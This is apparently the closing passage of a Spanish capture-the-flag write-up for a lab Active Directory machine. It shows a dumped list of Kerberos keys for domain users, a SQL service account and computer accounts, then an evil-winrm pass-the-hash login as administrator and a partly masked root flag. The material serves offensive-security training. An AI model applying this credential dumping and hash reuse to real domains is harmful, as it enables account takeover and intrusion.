Christine.Flanders:aes256-cts-hmac-sha1-96:ceb5854b48f9b203b4aa9a8e0ac4af28b9dc49274d54e9f9a801902ea73f17ba
Christine.Flanders:aes128-cts-hmac-sha1-96:e0fa68a3060b9543d04a6f84462829d9
Christine.Flanders:des-cbc-md5:8980267623df2637
Marie.Curie:aes256-cts-hmac-sha1-96:616e01b81238b801b99c284e7ebcc3d2d739046fca840634428f83c2eb18dbe8
Marie.Curie:aes128-cts-hmac-sha1-96:daa48c455d1bd700530a308fb4020289
Marie.Curie:des-cbc-md5:256889c8bf678910
Helen.Frost:aes256-cts-hmac-sha1-96:f8550ef43b2ae46bc649e06ed9d4d54bae0c0d1f11a6bfbcd4f70dffcf49d66f
Helen.Frost:aes128-cts-hmac-sha1-96:5c4172713fa75d9248d4184adf964b67
Helen.Frost:des-cbc-md5:f88ab3fee625cd02
Michael.Pontiac:aes256-cts-hmac-sha1-96:eca3a512ed24bb1c37cd2886ec933544b0d3cfa900e92b96d056632a6920d050
Michael.Pontiac:aes128-cts-hmac-sha1-96:53456b952411ac9f2f3e2adf433ab443
Michael.Pontiac:des-cbc-md5:833dc82fab76c229
Mallory.Roberts:aes256-cts-hmac-sha1-96:c9ad270adea8746d753e881692e9a75b2487a6402e02c0c915eb8ac6c2c7ab6a
Mallory.Roberts:aes128-cts-hmac-sha1-96:40f22695256d0c49089f7eda2d0d1266
Mallory.Roberts:des-cbc-md5:cb25a726ae198686
James.Dinkleberg:aes256-cts-hmac-sha1-96:c6cade4bc132681117d47dd422dadc66285677aac3e65b3519809447e119458b
James.Dinkleberg:aes128-cts-hmac-sha1-96:35b2ea5440889148eafb6bed06eea4c1
James.Dinkleberg:des-cbc-md5:83ef38dc8cd90da2
Ryan.Cooper:aes256-cts-hmac-sha1-96:d94424fd2a046689ef7ce295cf562dce516c81697d2caf8d03569cd02f753b5f
Ryan.Cooper:aes128-cts-hmac-sha1-96:48ea408634f503e90ffb404031dc6c98
Ryan.Cooper:des-cbc-md5:5b19084a8f640e75
sql_svc:aes256-cts-hmac-sha1-96:1decdb85de78f1ed266480b2f349615aad51e4dc866816f6ac61fa67be5bb598
sql_svc:aes128-cts-hmac-sha1-96:88f45d60fa053d62160e8ea8f1d0231e
sql_svc:des-cbc-md5:970d6115d3f4a43b
DC$:aes256-cts-hmac-sha1-96:0e50c0a6146a62e4473b0a18df2ba4875076037ca1c33503eb0c7218576bb22b
DC$:aes128-cts-hmac-sha1-96:7695e6b660218de8d911840d42e1a498
DC$:des-cbc-md5:3db913751c434f61
FS01$:aes256-cts-hmac-sha1-96:b51ed745a9a252a54f64514471c8d83c9c0a7b2255e9d7afc4e4d6ee0c796d58
FS01$:aes128-cts-hmac-sha1-96:82e8eba387db55114c9ffd8bd5339ef4
FS01$:des-cbc-md5:25f464ae57195832
[*] Cleaning up...
```

Y usando el hash del mismo podemos conectarnos por `WinRM`
```bash
evil-winrm -i redelegate.vl -u administrator -H ec17f7a2a4d96e177bfd101b94ffc0a7
```

Y asi podemos ver la flag de `root`.

```powershell
C:\users\administrator\desktop>type root.txt
3b1d4070************************
```

`Happy Hacking.`







